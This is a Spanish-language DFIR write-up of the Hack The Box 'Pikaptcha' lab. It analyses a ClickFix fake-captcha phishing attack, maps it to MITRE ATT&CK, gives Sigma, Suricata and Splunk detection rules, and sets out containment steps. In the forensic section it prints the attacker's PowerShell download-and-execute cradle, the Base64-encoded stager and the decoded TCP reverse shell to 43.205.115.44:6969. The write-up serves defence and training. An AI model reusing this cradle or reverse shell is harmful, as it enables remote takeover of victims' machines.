### [HTB-PIKAPTCHA: CLICKFIX FAKE CAPTCHA & FILELESS POWERSHELL C2 TRIAGE]

**Clasificación:** TLP:AMBER (Uso Interno — SOC / Incident Response)  
**Entorno / Plataforma:** Windows Endpoint Triage (KAPE) / PCAPNG Network Forensics / Registry Explorer / HTB Sherlock  
**Objetivo:** Estación de trabajo corporativa del usuario happy.grunwald / Dominio Forela

---

#### 1. Escenario, Contexto e Identificación del Incidente

- **Resumen Ejecutivo:** Se investigó un incidente de seguridad originado tras una alerta de ingeniería social reportada por la usuaria Happy Grunwald al administrador de sistemas (Alonzo). La usuaria interactuó con un enlace de phishing que simulaba una actualización obligatoria de Microsoft Office 2024. Al navegar al destino, fue dirigida a un portal fraudulento que presentaba una prueba de verificación humana falsa (técnica conocida en inteligencia de amenazas como **ClickFix** o Fake Captcha). El portal ejecutó una función JavaScript (stageClipboard) que depositó en el portapapeles del sistema operativo un comando ofuscado de PowerShell. Mediante instrucciones de engaño visual en pantalla, la víctima fue inducida a abrir la ventana Ejecutar de Windows (Win + R) y pegar el contenido. Dicho comando descargó y ejecutó en memoria (Fileless) el script de staging office2024install.ps1 desde el servidor malicioso 43.205.115.44, el cual abrió una reverse shell TCP interactiva contra el puerto 6969 que permaneció activa durante 403 segundos antes de que el equipo fuera aislado lógicamente.
    
- **Fuentes de Telemetría y Evidencias:**
    
    - Paquete de triaje pericial KAPE (2024-09-23T052209_alert_mssp_action.zip): Extracción del hive de registro del usuario NTUSER.DAT (C:\Users\happy.grunwald\NTUSER.DAT), prefetch y registros del sistema.
        
    - Captura de tráfico de red: pikaptcha.pcapng (tráfico HTTP, DNS y flujos TCP crudos hacia puertos no estándar).
        
    - Herramientas periciales aplicadas: Registry Explorer (Eric Zimmerman), Wireshark, tshark y CyberChef.
        

---

#### 2. Mapeo Táctico MITRE ATT&CK®

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica / Subtécnica|Nombre de la Técnica|Evidencia / Log Específico Hallado|
|**Initial Access**|T1566.002|Phishing: Spearphishing Link|Enlace en correo electrónico dirigiendo hacia infraestructura de falso captcha.|
|**Execution**|T1204.001|User Execution: Malicious Link|Navegación e interacción voluntaria de la víctima con el portal malicioso.|
|**Execution**|T1204.002|User Execution: Malicious Command / ClickFix|La víctima pegó y ejecutó el payload del portapapeles mediante el cuadro Ejecutar (RunMRU).|
|**Execution**|T1059.001|Command and Scripting Interpreter: PowerShell|Invocación de powershell.exe con bypass de ejecución y carga directa en memoria vía IEX.|
|**Defense Evasion**|T1027|Obfuscated Files or Information|Uso de codificación Base64 en UTF-16LE (powershell -e) para ocultar el script de socket TCP.|
|**Defense Evasion**|T1115|Clipboard Data|Abuso del portapapeles mediante la función JavaScript stageClipboard para depositar el stager.|
|**Command and Control**|T1095|Non-Application Layer Protocol|Reverse shell interactiva directa sobre socket TCP sin capa de aplicación hacia el puerto 6969.|

---

#### 3. Cadena de Infección y Análisis Forense Detallado

El análisis de los objetos HTTP reensamblados desde pikaptcha.pcapng reveló el código fuente de la página web del falso captcha alojada por el atacante:

- **Mecanismo de Engaño:** El sitio simulaba una pantalla de verificación de Cloudflare / reCAPTCHA. Al hacer clic en el botón de verificación, el script del navegador ejecutaba una función diseñada para inyectar código en el portapapeles de la víctima sin su consentimiento explícito.
    
- **Función JavaScript Identificada:** **stageClipboard**.
    
- **Acción del Script:** Invocaba la API del portapapeles del navegador (navigator.clipboard.writeText) cargando el comando de PowerShell que posteriormente el usuario ejecutó en el cuadro de diálogo de Windows.
    

En el paquete de triaje KAPE, se analizó el registro personal de la víctima (happy.grunwald):

- **Clave del Registro Inspeccionada:**  
    HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
    
- **Comando Localizado en el Valor de Ejecución:**
    


``` Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
```

- **Análisis de Evasión de Defensas en el Comando:**
    
    - -NoP (NoProfile): Evita la carga de perfiles locales de PowerShell para acelerar el inicio y evadir scripts de control locales.
        
    - -NonI (NonInteractive): Deshabilita prompts interactivos de confirmación.
        
    - -W Hidden (WindowStyle Hidden): Oculta la ventana de consola a la vista del usuario para no levantar sospechas.
        
    - -Exec Bypass (ExecutionPolicy Bypass): Elude la directiva de ejecución de scripts de Windows.
        
    - IEX(...) (Invoke-Expression): Descarga el contenido como texto en memoria RAM y lo compila directamente, sin escribir el archivo .ps1 en disco (ataque fileless que evade motores de detección estática convencionales).
        
- **Timestamp de Ejecución de la Carga Maliciosa (UTC):**  
    **2024-09-23 05:07:45 UTC** (obtenido a partir de la marca de tiempo de última modificación de la clave RunMRU).
    

A través de la reconstrucción de objetos HTTP en Wireshark, se aisló el archivo descargado desde http://43.205.115.44/office2024install.ps1:

- **Hash Criptográfico SHA-256:**  
    **579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de**
    
- **Inspección del Contenido:**  
    El archivo contenía una segunda invocación de PowerShell codificada:
    


```Powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

La decodificación del payload Base64 (codificación UTF-16LE / Unicode estándar de PowerShell) mediante CyberChef arrojó el código de comunicación por sockets:

codePowershell

``` Powershell
$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

- **Infraestructura C2:**
    
    - Dirección IP Destino: **43.205.115.44**
        
    - Puerto de Conexión: **6969** (TCP)
        
- **Persistencia Temporal de la Sesión:**
    
    - En pikaptcha.pcapng, el handshake SYN de la sesión ocurrió a las 05:07:54 UTC y el teardown/cierre TCP (FIN/RST) se registró a las 05:14:37 UTC.
        
    - **Duración de la Conexión C2:** Exactamente **403 segundos**.
        


``` bash
# Extracción de la sesión TCP en tshark para calcular la duración
tshark -r pikaptcha.pcapng -Y "tcp.port == 6969" -T fields -e frame.time_epoch | awk 'NR==1{first=$1} END{print $1-first}'
```

---

#### 4. Reglas de Detección e Ingeniería de Seguridad


``` Yaml
title: Ejecucion de PowerShell con Parametros de Descarga via RunMRU
id: 9b2104a1-e471-4821-99a1-clickfixpowershell
status: production
description: Detecta comandos de PowerShell con bypass de politicas y download cradles originados por el proceso explorer.exe (patron de ataque ClickFix).
references:
  - https://attack.mitre.org/techniques/T1204/002/
author: Senior DFIR Specialist
date: 2024-09-24
logsource:
  product: windows
  service: sysmon
detection:
  selection_process:
    EventID: 1
    Image|endswith: '\powershell.exe'
    ParentImage|endswith: '\explorer.exe'
    CommandLine|contains|all:
      - '-NoP'
      - '-W Hidden'
      - 'IEX'
      - 'DownloadString'
  condition: selection_process
level: critical
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1204.002
```

- **Consideraciones de Falso Positivo:** Extremadamente bajas. Los usuarios finales no ejecutan scripts de descarga web ocultos a través del cuadro de diálogo Win + R.
    
- **Tuning:** Si existen scripts administrativos aprobados, deben ejecutarse desde consolas elevadas o mediante tareas programadas documentadas, no como procesos hijos de explorer.exe.
    


``` Suricata
alert tcp $HOME_NET any -> $EXTERNAL_NET 6969 (msg:"SOC - Deteccion de Reverse Shell TCP Interactiva de PowerShell"; flow:established,to_server; content:"PS "; content:"> "; distance:0; fast_pattern; classtype:trojan-activity; sid:20260421; rev:1;)
```

- **Consideraciones de Falso Positivo:** Ninguna en puertos no estándar como el 6969.
    
- **Tuning:** Monitorear el patrón PS *> saliente en cualquier puerto TCP que no corresponda a protocolos corporativos documentados.
    


``` SPL
index=sysmon EventCode=3 Image="*\\powershell.exe" NOT DestinationPort IN (80, 443, 53, 5985, 5986)
| stats count min(_time) as inicio max(_time) as fin by Computer, User, DestinationIp, DestinationPort
| convert ctime(inicio) ctime(fin)
| table inicio, fin, Computer, User, DestinationIp, DestinationPort, count
```

- **Consideraciones de Falso Positivo:** Scripts legítimos de DevOps o Azure CLI que interactúen con APIs en puertos específicos (deben ponerse en lista blanca por destino).
    
- **Tuning:** Excluir rangos IP públicos oficiales de Microsoft Azure y Microsoft 365.
    

---

#### 5. Plan de Contención, Erradicación y Hardening

1. **Aislamiento Físico y Lógico:** Mantener en cuarentena estricta la estación de trabajo de happy.grunwald en el EDR para impedir movimiento lateral.
    
2. **Terminación de Procesos:** Asegurar la terminación de cualquier subproceso huérfano de powershell.exe ejecutándose bajo la sesión de la usuaria.
    
3. **Bloqueo Perimetral Inmediato de IOCs:**
    
    - Bloquear el tráfico bidireccional hacia la IP del atacante **43.205.115.44** en el cortafuegos corporativo.
        
    - Bloquear el tráfico saliente general hacia el puerto TCP **6969**.
        
4. **Rotación de Credenciales:** Resetear de forma obligatoria las credenciales del usuario happy.grunwald en Active Directory ante la posibilidad de que el atacante haya ejecutado comandos de extracción de credenciales (mimikatz, volcado de SAM o DPAPI) durante los 403 segundos de sesión interactiva.
    

5. **Modo de Lenguaje Restringido (PowerShell Constrained Language Mode - CLM):**
    
    - Forzar CLM en todas las estaciones de trabajo cliente mediante directivas de control de aplicaciones (AppLocker o Windows Defender Application Control - WDAC), impidiendo que scripts no firmados puedan invocar métodos del espacio de nombres .NET como System.Net.Sockets.TCPClient o Net.WebClient.
        
6. **Reglas de Reducción de Superficie de Ataque (ASR):**
    
    - Habilitar la directiva ASR: Block executable content from email client and webmail.
        
    - Habilitar la directiva ASR: Block JavaScript or VBScript from launching downloaded executable content.
        
7. **Campañas de Concienciación contra la Técnica ClickFix:**
    
    - Capacitar a los empleados para reconocer los vectores de falso captcha que solicitan abrir consolas del sistema (Win + R, cmd, powershell) o pulsar combinaciones de teclas para "verificar que son humanos".
        
8. **Filtrado DNS y Pasarela Web (SWG):**
    
    - Bloquear el acceso a dominios recién registrados (NRDs) y categorías de riesgo que alojen sitios que intenten interactuar con el portapapeles local sin políticas de seguridad habilitadas.